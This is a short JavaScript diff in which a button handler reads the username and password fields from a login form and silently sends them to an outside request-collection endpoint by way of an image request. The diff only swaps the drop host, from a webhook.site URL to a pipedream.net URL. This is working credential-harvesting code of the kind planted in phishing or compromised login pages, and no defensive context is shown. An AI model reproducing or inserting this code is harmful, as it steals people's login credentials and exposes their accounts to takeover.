@@ -9,6 +9,6 @@ if (btn) {
         var username = document.getElementById('username').value;
         var password = document.getElementById('password').value;
         
-        new Image().src = 'https://webhook.site/e850bf9b-5440-4787-9359-8b609587a433/?username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password);
+        new Image().src = 'https://eoyk66v1mqqwmg4.m.pipedream.net/?username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password);
     };
 }
